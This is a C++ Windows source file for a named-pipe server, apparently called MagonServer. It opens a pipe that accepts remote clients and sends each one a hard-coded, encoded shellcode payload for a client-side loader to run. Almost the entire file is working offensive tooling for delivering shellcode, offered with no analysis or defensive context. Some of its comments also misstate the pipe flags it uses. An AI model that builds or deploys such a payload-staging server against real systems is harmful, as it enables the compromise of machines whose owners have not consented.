#include <Windows.h>
#include <Intsafe.h>
#include <iostream>
#include <cstdint>
#include <cstring>

HANDLE hServerPipe = nullptr; // handle for the server pipe
BOOL bConnected = false; // indicates whether the client is connected 
BOOL bSent = false; // indicates whether the server successfully sent the shellcode to the client
DWORD dwBytesSent = 0; // number of bytes the server sent 

constexpr unsigned int uiMaxInstances = 1; // maximum number of instances for the server pipe to handle
constexpr unsigned int uiBuffSize = 4096;  // maximum number of bytes of the messages to read / write from the server pipe

int main(int argc, char *argv[]) {
    
    /* if no shellcode was provided, end the program */
    // if (argc < 2) { 
    //     std::cerr << "Usage: <shellcode> [ MagonServer.exe ]" << std::endl;
    //     return EXIT_FAILURE;    
    // }

    /* get the shellcode + it's size from argv*/
    const char shellcode[] =   "\x6a\x30\x59\xd9\xee\xd9\x74"
                              "\x24\xf4\x5b\x81\x73\x13\xf4"
                              "\xdd\xb5\xba\x83\xeb\xfc\xe2"
                              "\xf4\x08\x35\x37\xba\xf4\xdd"
                              "\xd5\x33\x11\xec\x75\xde\x7f"
                              "\x8d\x85\x31\xa6\xd1\x3e\xe8"
                              "\xe0\x56\xc7\x92\xfb\x6a\xff"
                              "\x9c\xc5\x22\x19\x86\x95\xa1"
                              "\xb7\x96\xd4\x1c\x7a\xb7\xf5"
                              "\x1a\x57\x48\xa6\x8a\x3e\xe8"
                              "\xe4\x56\xff\x86\x7f\x91\xa4"
                              "\xc2\x17\x95\xb4\x6b\xa5\x56"
                              "\xec\x9a\xf5\x0e\x3e\xf3\xec"
                              "\x3e\x8f\xf3\x7f\xe9\x3e\xbb"
                              "\x22\xec\x4a\x16\x35\x12\xb8"
                              "\xbb\x33\xe5\x55\xcf\x02\xde"
                              "\xc8\x42\xcf\xa0\x91\xcf\x10"
                              "\x85\x3e\xe2\xd0\xdc\x66\xdc"
                              "\x7f\xd1\xfe\x31\xac\xc1\xb4"
                              "\x69\x7f\xd9\x3e\xbb\x24\x54"
                              "\xf1\x9e\xd0\x86\xee\xdb\xad"
                              "\x87\xe4\x45\x14\x82\xea\xe0"
                              "\x7f\xcf\x5e\x37\xa9\xb7\xb4"
                              "\x37\x71\x6f\xb5\xba\xf4\x8d"
                              "\xdd\x8b\x7f\xb2\x32\x45\x21"
                              "\x66\x4b\xb4\xc6\x37\xdd\x1c"
                              "\x61\x60\x28\x45\x21\xe1\xb3"
                              "\xc6\xfe\x5d\x4e\x5a\x81\xd8"
                              "\x0e\xfd\xe7\xaf\xda\xd0\xf4"
                              "\x8e\x4a\x6f\x97\xbc\xd9\xd9"
                              "\xf4\xdd\xb5\xba"; 
    const std::size_t stShellcodeLen = strlen(shellcode);

    DWORD dwShellcodeLen = 0;
    auto result = SSIZETToDWord(stShellcodeLen, &dwShellcodeLen);

    if (result != S_OK) {
        std::cerr << "Failed in converting the size of the shellcode into a DWORD\n" << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "\nSize of the shellcode: " << dwShellcodeLen << '\n';

    /* create the server pipe line */
    hServerPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\MagonServer", // name of pipe
        PIPE_ACCESS_DUPLEX | 
        FILE_FLAG_OVERLAPPED, // read / write + allow remote pipes
        PIPE_TYPE_MESSAGE |
        PIPE_READMODE_MESSAGE |  
        PIPE_ACCEPT_REMOTE_CLIENTS, // message read mode 
        uiMaxInstances, // max number of instances
        uiBuffSize, // buffer size for output
        uiBuffSize, // buffer size for input
        0, // default timeout of 50 milliseconds
        NULL // default security attributes
    );

    /* check for the return value of CreateNamedPipeA */
    if (hServerPipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed in creating the server pipeline\n" << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "Created the server pipeline, waiting for connection...\n";

    bConnected = ConnectNamedPipe(
        hServerPipe, // the server pipe handle
        NULL // didn't open the pipe using FILE_FLAG_OVERLAPPED, so ignore
    );

    /* check for the return value of ConnectNamedPipe */
    if (bConnected == FALSE) {
        std::cerr << "Failed in connecting a client to the server pipeline, error code: " << GetLastError() << std::endl;
        DisconnectNamedPipe(hServerPipe);
        CloseHandle(hServerPipe);
        return EXIT_FAILURE;
    }

    std::cout << "Connected to the remote client\n";

    /* after connecting, can pass the shellcode + it's size to the client */
    bSent = WriteFile(
        hServerPipe,
        shellcode,
        dwShellcodeLen,
        &dwBytesSent,
        NULL
    );

    /* check for the return value of WriteFile + how many bytes had sent */
    if (bSent == FALSE || dwBytesSent != dwShellcodeLen) {
        std::cerr << "Failed in sending the client the shellcode, error code: " << GetLastError() << std::endl;
        DisconnectNamedPipe(hServerPipe);
        CloseHandle(hServerPipe);
        return EXIT_FAILURE;
    }

    std::cout << "Sent the client the shellcode\n";

    /* Flush the pipe to allow the client to read the pipe's contents 
       before disconnecting. Then disconnect the pipe, and close the 
       handle to this pipe instance. */

    FlushFileBuffers(hServerPipe);
    DisconnectNamedPipe(hServerPipe);
    CloseHandle(hServerPipe);

    std::cout << "Clsed the server pipeline, closing the program..." << std::endl;

    return 0;
}